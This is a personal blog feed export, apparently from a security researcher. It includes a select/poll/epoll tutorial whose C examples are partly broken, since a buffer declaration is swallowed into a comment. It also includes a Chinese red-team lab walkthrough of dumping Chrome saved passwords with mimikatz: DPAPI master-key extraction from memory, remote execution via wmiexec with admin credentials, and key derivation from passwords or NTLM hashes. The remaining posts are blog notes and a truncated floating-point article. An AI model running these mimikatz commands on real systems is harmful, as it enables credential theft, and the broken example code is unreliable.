<li>Performance: Every call to <code>select</code> requires the kernel to walk through the entire list of file descriptors to check their states, which can become inefficient for a large number of file descriptors.</li>
<li>FD_SET Management: You must reset the file descriptor set for each call.</li>
</ul>
</li>
</ul>
<h3 id="Poll">Poll</h3>
<ul>
<li>
<p>Overview: <code>poll</code> was introduced to overcome some of the <code>select</code> limitations.</p>
</li>
<li>
<p>Functionality: Similar to <code>select</code>, but it uses a different approach to handle file descriptors, allowing a greater number.</p>
</li>
<li>
<p>Advantages:</p>
<ul>
<li>No Hard Limit: Unlike <code>select</code>, <code>poll</code> does not have a hardcoded limit on the number of file descriptors it can monitor.</li>
<li>Simplified Interface: Instead of managing multiple fd sets, <code>poll</code> uses a single array of <code>pollfd</code> structures.</li>
</ul>
</li>
<li>
<p>Limitations:</p>
<ul>
<li>Performance: Though better than <code>select</code>, it still requires iterating over the entire list of file descriptors, which can be computationally expensive as the number of descriptors grows.</li>
</ul>
</li>
</ul>
<h3 id="Epoll">Epoll</h3>
<ul>
<li>
<p>Overview: <code>epoll</code> is specific to Linux and designed to be more efficient and scalable than both <code>select</code> and <code>poll</code>.</p>
</li>
<li>
<p>Functionality: It allows management of a large number of file descriptors with better performance characteristics.</p>
</li>
<li>
<p>Advantages:</p>
<ul>
<li>Scalability: Ideal for applications with a high number of file descriptors (thousands or more).</li>
<li>Efficiency: Uses a ready list instead of scanning all descriptors. The kernel tracks which file descriptors are “active,” which saves resources.</li>
<li>Edge/Level Triggering: Offers two modes (edge-triggered and level-triggered) giving developers finer control over the handling of ready events.</li>
<li>Persistent Interest: Once you register interest in certain events, <code>epoll</code> keeps the interest until explicitly changed or removed.</li>
</ul>
</li>
<li>
<p>Limitations:</p>
<ul>
<li>Complexity: Programming with <code>epoll</code> can be more complex, requiring a good understanding of its behavior, especially with edge-triggered semantics.</li>
</ul>
</li>
</ul>
<h3 id="Choosing-the-Right-System-Call">Choosing the Right System Call</h3>
<ul>
<li>Select: Rarely used in modern applications due to its limitations, but can be suitable for smaller, less demanding applications.</li>
<li>Poll: A reasonable choice when you need more capability than <code>select</code> offers, without needing the complexity of <code>epoll</code>.</li>
<li>Epoll: The preferred choice for high-performance server applications on Linux due to its scalability and efficient event notification handling.</li>
</ul>
<h3 id="Practical-Considerations">Practical Considerations</h3>
<ul>
<li>When designing networked applications, especially servers, the choice between <code>select</code>, <code>poll</code>, and <code>epoll</code> can significantly impact performance.</li>
<li>Understand the workload and environment specifics to make an informed decision. For example, cross-platform applications might prefer <code>poll</code> for its broader compatibility.</li>
<li>Always consider the trade-offs between complexity and performance. While <code>epoll</code> offers great performance, it requires careful handling of edge cases in event management.</li>
</ul>
<p>In conclusion, a solid understanding of <code>select</code>, <code>poll</code>, and <code>epoll</code> not only helps in choosing the right tool for your application needs but also aids in optimizing the application’s performance in a networked infrastructure.</p>
<h2 id="select-poll-epoll代码">select, poll, epoll代码</h2>
<p>Certainly! Let’s modify the examples to demonstrate how to use <code>select</code>, <code>poll</code>, and <code>epoll</code> for file I/O operations. Since file operations are often simpler than networking operations, these examples will assume we’re using a non-blocking read operation on a file.</p>
<h3 id="Common-Setup">Common Setup</h3>
<p>First, let’s ensure we have a file to work with:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>  #<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  #<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  #<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  int setup_file(const char *filename) &#123;  </span></span><br><span class="line">    <span class="type">int</span> fd = open(filename, O_RDONLY | O_NONBLOCK);  </span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;  </span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> fd;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">When you open a file with the O_NONBLOCK flag, </span></span><br><span class="line"><span class="comment">it specifies that subsequent operations (like read or write) on the file descriptor should be non-blocking </span></span><br><span class="line"><span class="comment">if they support non-blocking behavior. </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>This <code>setup_file</code> function will open a file in non-blocking mode, which is essential for non-blocking I/O operations.</p>
<h3 id="Select-Example-with-File-I-O">Select Example with File I/O</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/select.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">int</span> fd = setup_file(<span class="string">&quot;example.txt&quot;</span>);  </span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line"></span><br><span class="line">    fd_set readfds;  </span><br><span class="line">    FD_ZERO(&amp;readfds);  </span><br><span class="line">    FD_SET(fd, &amp;readfds);  </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span>  </span><br><span class="line">    tv.tv_sec = <span class="number">5</span>;  <span class="comment">// Wait for up to 5 seconds  </span></span><br><span class="line">    tv.tv_usec = <span class="number">0</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> retval = select(fd + <span class="number">1</span>, &amp;readfds, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;tv);  </span><br><span class="line">    <span class="keyword">if</span> (retval == <span class="number">-1</span>) &#123;  </span><br><span class="line">        perror(<span class="string">&quot;select&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (retval) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (FD_ISSET(fd, &amp;readfds)) &#123;  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;File is ready for reading.\n&quot;</span>);  </span><br><span class="line">            <span class="comment">// Read from the file  char buffer[1024];  </span></span><br><span class="line">            <span class="type">ssize_t</span> bytes_read = read(fd, buffer, <span class="keyword">sizeof</span>(buffer));  </span><br><span class="line">            <span class="keyword">if</span> (bytes_read &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Read %zd bytes: %.*s\n&quot;</span>, bytes_read, (<span class="type">int</span>)bytes_read, buffer);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No data read within five seconds.\n&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    close(fd);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<h3 id="Poll-Example-with-File-I-O">Poll Example with File I/O</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">int</span> fd = setup_file(<span class="string">&quot;example.txt&quot;</span>);  </span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">fds</span>[1];</span>  </span><br><span class="line">    fds[<span class="number">0</span>].fd = fd;  </span><br><span class="line">    fds[<span class="number">0</span>].events = POLLIN;  </span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> retval = poll(fds, <span class="number">1</span>, <span class="number">5000</span>);  <span class="comment">// Wait for 5 seconds  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (retval == <span class="number">-1</span>) &#123;  </span><br><span class="line">        perror(<span class="string">&quot;poll&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (retval &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (fds[<span class="number">0</span>].revents &amp; POLLIN) &#123;  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;File is ready for reading.\n&quot;</span>);  </span><br><span class="line">            <span class="comment">// Read from the file  char buffer[1024];  </span></span><br><span class="line">            <span class="type">ssize_t</span> bytes_read = read(fd, buffer, <span class="keyword">sizeof</span>(buffer));  </span><br><span class="line">            <span class="keyword">if</span> (bytes_read &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Read %zd bytes: %.*s\n&quot;</span>, bytes_read, (<span class="type">int</span>)bytes_read, buffer);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No data read within five seconds.\n&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    close(fd);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<h3 id="Epoll-Example-with-File-I-O">Epoll Example with File I/O</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_EVENTS 5  </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">int</span> fd = setup_file(<span class="string">&quot;example.txt&quot;</span>);  </span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> epoll_fd = epoll_create1(<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span> (epoll_fd == <span class="number">-1</span>) &#123;  </span><br><span class="line">        perror(<span class="string">&quot;epoll_create1&quot;</span>);  </span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span>  </span><br><span class="line">    event.events = EPOLLIN;  </span><br><span class="line">    event.data.fd = fd;  </span><br><span class="line">    <span class="keyword">if</span> (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &amp;event) == <span class="number">-1</span>) &#123;  </span><br><span class="line">        perror(<span class="string">&quot;epoll_ctl&quot;</span>);  </span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">events</span>[<span class="title">MAX_EVENTS</span>];</span>  </span><br><span class="line">    <span class="type">int</span> n = epoll_wait(epoll_fd, events, MAX_EVENTS, <span class="number">5000</span>);  <span class="comment">// Wait for 5 seconds  </span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">-1</span>) &#123;  </span><br><span class="line">        perror(<span class="string">&quot;epoll_wait&quot;</span>);  </span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (events[i].data.fd == fd) &#123;  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;File is ready for reading.\n&quot;</span>);  </span><br><span class="line">            <span class="comment">// Read from the file  char buffer[1024];  </span></span><br><span class="line">            <span class="type">ssize_t</span> bytes_read = read(fd, buffer, <span class="keyword">sizeof</span>(buffer));  </span><br><span class="line">            <span class="keyword">if</span> (bytes_read &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Read %zd bytes: %.*s\n&quot;</span>, bytes_read, (<span class="type">int</span>)bytes_read, buffer);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    close(epoll_fd);  </span><br><span class="line">    close(fd);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<h3 id="Explanation">Explanation</h3>
<ul>
<li>File Descriptor: Each example utilizes <code>setup_file</code> to open a file named <code>example.txt</code> in non-blocking mode. You need to ensure this file exists for these examples to work.</li>
<li>Select, Poll, Epoll: These functions check if the file is ready for reading within a 5-second window.</li>
<li>Reading from the File: Once data is available, the programs proceed to read it using <code>read()</code>.</li>
</ul>
<p>These examples demonstrate how non-blocking I/O operations can be handled for files using <code>select</code>, <code>poll</code>, and <code>epoll</code>, analogous to how they would be used for sockets.</p>
<h2 id="Does-Select-Map-File-Contents-to-Memory">Does Select Map File Contents to Memory?</h2>
<ul>
<li>No Direct Mapping: The <code>select</code> system call itself does not map file contents to memory. Its purpose is strictly to monitor the readiness of file descriptors for I/O operations.</li>
<li>Content Access: It does not involve reading or writing file contents. Once <code>select</code> indicates that a file descriptor is ready, you still need to perform actual read or write operations on the file descriptor to access or modify content.</li>
</ul>
<p>For regular files opened with non-blocking flags, <code>select</code> can be used to check readiness, although it is most useful for scenarios where I/O operations may block, such as with network sockets or pipes. Regular file systems often support ready operations differently than sockets do, making non-blocking I/O and readiness a key concern for network and inter-process communications.</p>
]]></content>
      <tags>
        <tag>talking big</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>使用mimikatz导出chrome密码</title>
    <url>/2019/12/09/%E4%BD%BF%E7%94%A8mimikatz%E5%AF%BC%E5%87%BAchrome%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<!-- 在各种场景下使用mimikatz导出chrome的姿势 -->
<!-- more -->
<h2 id="模拟场景">模拟场景</h2>
<p>在获取某PC本地administrator的权限情况下，导出使用该PC机域普通账号的密码。</p>
<p>受害机ip：192.168.3.4</p>
<p>受害机账户：</p>
<ul>
<li>本地管理员：administrator/toor</li>
<li>域普通账户：beta\fengjie/qqq123!@#</li>
</ul>
<h2 id="加密机制简介">加密机制简介</h2>
<p>chrome储存的明文密码时使用windows提供的DPAPI进行对称加密来保证安全性。加解密的密钥称为master key。master key被用户登录密码、SID和16字节随机数加密后保存在Master Key file（<code>%APPDATA%\Microsoft\Protect\%SID%</code>）中。</p>
<h2 id="最简单的情况：A用户拖A自己的密码">最简单的情况：A用户拖A自己的密码</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpapi::chrome /in:&#x27;C:\Users\fengjie\AppData\Local\Google\Chrome\User</span><br><span class="line">Data\Default\Login Data&#x27; /unprotect</span><br></pre></td></tr></table></figure>
<h2 id="在A用户登陆状态B解密A的chrome密码">在A用户登陆状态B解密A的chrome密码</h2>
<p>在用户登陆状态下可以直接用procdump或者mimikatz直接从内存中获取master key。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::dpapi</span><br><span class="line"></span><br><span class="line">python wmiexec.py administrator:toor@192.168.3.4 &#x27;c:\users\public\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot; exit&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="./1575901995739.png" alt="Alt text"></p>
<p>获取到masterkey</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0bf0be64d4dc768a543b3a12d7c5210d184c07a3861cad8f2bd8b7bbacc60fd0e06e955b6dad057d070d1ce3b2bb331fd8dbce6efad08808f1849e4f4ef26d80</span><br><span class="line"></span><br><span class="line">1b81b1c9cb66a3f93b58f85948e8ce53779c6e5d</span><br></pre></td></tr></table></figure>
<p>接下来用mimikatz一把梭就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python wmiexec.py administrator:toor@192.168.3.4 &#x27;cd c:\users\public &amp;&amp; Minimimini64.exe &quot;dpapi::chrome /in:\&quot;C:\Users\fengjie\AppData\Local\Google\Chrome\User Data\Default\Login Data\&quot; /masterkey:1b81b1c9cb66a3f93b58f85948e8ce53779c6e5d&quot; exit &#x27;</span><br></pre></td></tr></table></figure>
<p>最开始用wmiexec并未解密成功<br>
<img src="./1575902015580.png" alt="Alt text"></p>
<p>后来发现是wmiexec的锅换成psexec就好了（<strong>用smbexec也可以，怀疑是因为用wmiexec时令牌完整性受限的原因，知道的师傅请教我一手</strong>）<br>
<img src="./1575902027549.png" alt="Alt text"></p>
<h2 id="在A用户离线状态B解密A的chrome密码">在A用户离线状态B解密A的chrome密码</h2>
<p>现在用mimikatz重新抓已经抓不到fengjie的master key了<br>
<img src="./1575902048343.png" alt="Alt text"></p>
<h3 id="用户明文密码已知">用户明文密码已知</h3>
<p>这种情况下有两种方法可以选择。</p>
<p>1.如果我们知道fengjie的明文密码，可以用runas降权(或者进行一些spwan的操作降权)，降权之后又回到了最简单的情况。（因为runas需要交互式shell，所以这种方法比较鸡肋）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runas /user:fengjie@beta.com &quot;cmd.exe&quot;</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Cookies” /unprotect</span><br></pre></td></tr></table></figure>
<p>2.在没有交互式的情况下可以直接用mimikatz直接算出<code>master key</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpapi::masterkey /in:&quot;c:\Users\fengjie\AppData\Roaming\Microsoft\Protect\S-1-5-21-2274946182-2013957047-1890316882-1632\59a94dbc-6dbb-4d51-bec0-edebc6f2e9f8&quot; /password:qqq123!@#</span><br></pre></td></tr></table></figure>
<p><img src="./1575902064361.png" alt="Alt text"></p>
<p>拿到master key后情况又相当于又转换回了用户在线的情景。</p>
<h3 id="用户明文密码未知，知道NTLM-hash">用户明文密码未知，知道NTLM hash</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpapi::masterkey /in:&quot;c:\Users\fengjie\AppData\Roaming\Microsoft\Protect\S-1-5-21-2274946182-2013957047-1890316882-1632\59a94dbc-6dbb-4d51-bec0-edebc6f2e9f8&quot; /hash:632f6adad4510099d676724bfb87c6ee</span><br></pre></td></tr></table></figure>
<p><img src="./1575902075847.png" alt="Alt text"></p>
<h2 id="总结">总结</h2>
<p>简单的说就是三种情况</p>
<ul>
<li>A用户获取自己chrome密码不需要知道master key</li>
<li>A获取B用户，如果B用户在线，那么可以直接从内存中抓取出B的maste key</li>
<li>A获取B用户，B不在线，就需要用b用户的明文密码或者NTLM hash计算出master key,在回到上面一步。</li>
</ul>
<h2 id="参考">参考</h2>
<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">渗透技巧——导出Chrome浏览器中保存的密码</a><br>
<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">渗透技巧——离线导出Chrome浏览器中保存的密码</a><br>
<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码</a><br>
<a href="https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107">Operational Guidance for Offensive User DPAPI Abuse</a><br>
<a href="https://bbs.pediy.com/thread-247634.htm">[翻译]滥用User DPAPI进行攻击的操作指南</a></p>
]]></content>
      <categories>
        <category>redteam</category>
      </categories>
      <tags>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>博客重启小记</title>
    <url>/2019/12/22/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<p>大约是在一七年那个寒假开始写技术博客，中间断断续续的更新到一八年六月。重新写博客是起于今年九月份的临时起意，一方面是想督促自己“有意识”的进步，另外一方面是假装做做技术输出。最开始博客用的是hexo，重启之后另起炉灶用是wordpress，因为并不想付云服务器月租所以决定换回hexo。在弃更到重启这段期间因为换过新笔记本并且再加上没有备份，所以之前的博客文章的md版已经灾难性的消失。大约花了一天多的时间慢慢把网页手工恢复成符合hexo格式的md（大概部分文章仍然会有格式上的错误），在整理的时候发现自己以前的文章表意不清，部分地方是片面甚至错误的（以后抽时间慢慢改，咕咕咕？）。以上～</p>
]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title>博客重启小记（2）</title>
    <url>/2024/08/10/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0%EF%BC%882%EF%BC%89/</url>
    <content><![CDATA[<span id="more"></span>
<p>有两年多年没有写博客了，最近一次写的话题还是weblogic RCE挖掘 《记一次失败的Weblogic IIOP Gadget挖掘》。虽然当时写的时候标题是“失败的”，但其实后面确实启发了另一位师傅拿到了RCE （CVE-2022-21420）。我要感谢这位师傅，不但因为它挽救了这次失败的利用，还因为它总是在过年的时候给我发红包，手动狗头。</p>
<p>安全研究是一门艺术，是守正出奇，是推陈出新，是对创造力的磨练。有一起研究技术的小伙伴是幸福的，感谢大学四年能遇到Syclover小组。</p>
<p>毕业后去了上海，又辗转香港，如今上坡两年了，准备第二次重启我的博客。未来准备更新一些学习binary和distributed system的学习笔记。</p>
<p>之前redteam.today域名已经被别人买走，以后打算长期用cl0und.github.io了。看到博客友链中能正常访问的已经所剩无几，这更让我到体会长期写博客的不易。希望这次我能坚持得更久一些😆</p>
<p>顺颂夏安。</p>
]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title>浮点数精度，printf，格式化字符串漏洞</title>
    <url>/2024/08/31/%E6%B5%AE%E7%82%B9%E6%95%B0%E7%B2%BE%E5%BA%A6%EF%BC%8Cprintf%EF%BC%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<!-- more -->
<p>文中各种图片引用自不同的blog都附在参考链接里面了，侵删。</p>
<h2 id="浮点数的存储">浮点数的存储</h2>
<p>单精度浮点数 (single precision floating point) 的表示方式遵循 IEEE 754 标准。这种表示方式由32位组成：</p>
<ul>
<li>1位用于符号位 (sign bit)</li>
<li>8位用于指数 (exponent)</li>
<li>23位用于尾数 (mantissa or significand)</li>
</ul>
<p><img src="image1.png" alt=""></p>
<p>双精度类似，此时指数位有11，尾数有52</p>
<p><img src="image2.png" alt=""></p>
<p>手工转换的思路是分别把整数部分和小数部分换成二进制，然后缩放成1.X * 2^n的二进制版本科学计数法。此时</p>
<p>.X部分为尾数部分，n为<strong>阶码</strong>需要加上127，如果n为1那么指数位就是127+1 = 128。之所以会有这个规定，是为了考虑到n为负数的情况（只考虑正数的情况，十进制下小于1）。</p>
<p>下面以8.5存储为单精度为例</p>
<ul>
<li>
<p>8.5 是正数，所以符号位为 0。</p>
</li>
<li>
<p>整数部分是 8，转换为二进制是 1000。</p>
</li>
<li>
<p>小数部分是 0.5。将其转换为二进制：</p>
<ul>
<li>0.5 × 2 = 1.0，整数部分是 1</li>
</ul>
</li>
<li>
<p>所以，0.5 的二进制是 0.1。</p>
</li>
<li>
<p>8.5 的二进制表示为 1000.1。</p>
</li>
<li>
<p>将二进制数表示为规范化形式：1.0001 × 2^3。</p>
</li>
<li>
<p>指数是 3，加上偏移量 127，得到 130。</p>
</li>
<li>
<p>130 的二进制表示为 10000010。</p>
</li>
<li>
<p>尾数是规范化形式中小数点后的部分：0001，补足到 23 位：00010000000000000000000</p>
</li>
<li>
<p>符号位 + 指数 + 尾数 = 0 10000010 00010000000000000000000。</p>
</li>
</ul>
<p><img src="image3.png" alt=""></p>
<h2 id="浮点数的分类">浮点数的分类</h2>
<p>当然其实上面介绍的只是浮点数的一种类型的求值方式：规格化浮点数。</p>
<p>浮点数有三种分类，<a href="https://www.cnblogs.com/zuoxiaolong/p/computer11.html">这篇文章</a>总结非常好直接抄过来</p>
<ol>
<li>
<p>规格化浮点数</p>
<ol>
<li>此时指数位范围是1至254，因此对应阶码的范围则为-126至127</li>
<li>尾数位是一个小于1的小数，在计算真实浮点数字的时候需要+1 （真实的尾数M = 1 + f）。相当于我们省掉了1位二进制，形成了浮点数表示的约定，默认尾数的值还有一个最高位的1。</li>
</ol>
</li>
<li>
<p>非规格化浮点数，</p>
<ol>
<li>指数位全为0</li>
<li>非规格化的方式与规格化不同，它不会对尾数进行加1的处理，也就是说，真实的尾数M = f。这是为了能够表示0这个数值，否则的话尾数总是大于1，那么无论如何都将得不到0这个数值。</li>
</ol>
</li>
<li>
<p>特殊值</p>
<ol>
<li>在阶码全为1时，如果尾数位全为0，则表示无穷大。符号位为0则表示正无穷大，相反则表示负无穷大。</li>
<li>倘若尾数位不全为0时，此时则表示NaN，表示不是一个数字。</li>
<li>这一点在Javascript当中有一个相关的函数与这个NaN的含义有点类似，它的作用是用来判断一个参数是否是一个数字。</li>
</ol>
</li>
</ol>
<p><img src="image4.png" alt=""></p>
<p>由此可以看出来，浮点数的取值范围。</p>
<p><img src="image5.png" alt=""></p>
<p>举个例子非规格化浮点数（考虑单精度，正数）</p>
<ol>
<li>非规格化数的最小值 = 2^-23 * 2^-126 = 2 ^ -149</li>
<li>非格式化数最大值 = (2^-1 + 2^-2 + … + 2 ^ -23)* 2^-126 = (1−2^-23) * 2^-126</li>
</ol>
<p><a href="https://blog.csdn.net/dreamer2020/article/details/24158303">引用结论</a></p>
<blockquote>
<p>通过上面的分析可以发现，尽管浮点数表示的范围很广，但由于精度损失的存在，加上幂次的放大作用，一个浮点数实际上是表示了周围的一个有理数区间。如果将浮点数绘制到一个数轴上，直观上看，靠近0的部分，浮点数出现较密集。越靠近无穷大，浮点数分布越稀疏，一个浮点值代表了周围一片数据。从这个意义上来说，浮点数不宜直接比较相等，它们是代表了一个数据范围。实际应用中，如果要使用浮点数计算，一定要考虑精度问题。在满足精度要求的前提下，计算结果才是有效的。 在计算精度要求情形下，例如商业计算等，应该避免使用浮点数，严格采取高精度计算。</p>
</blockquote>
<p><img src="image6.png" alt=""></p>
<p>再啰嗦一句，帮助理解，也就是这里非规格化数的最小值2 ^ -149代表了 0到2 ^ -149之间的所有正数。</p>
<h2 id="浮点数的精度">浮点数的精度</h2>
<p>单精度浮点数的精度主要由尾数部分决定。由于尾数有23位，加上隐含的1位，总共有24位的有效数字。</p>
<p>现在，我们来计算这 24 位二进制数可以表示多少位十进制有效数字：log₁₀(2²⁴) ≈ 7.22</p>
<p>这意味着单精度浮点数理论上可以精确表示大约 7位十进制有效数字，这里再对有效数字做一个定义</p>
<ul>
<li>非零数字总是有效数字。</li>
<li>在非零数字之间的零是有效数字。</li>
<li>小数点左边的前导零不是有效数字。</li>
<li>小数点右边的尾随零可能是有效数字，这取决于测量的精度</li>
</ul>
<h2 id="再看prinf">再看prinf</h2>
<p>抄这篇文章的题目，读者可以思考一下输出是什么。</p>
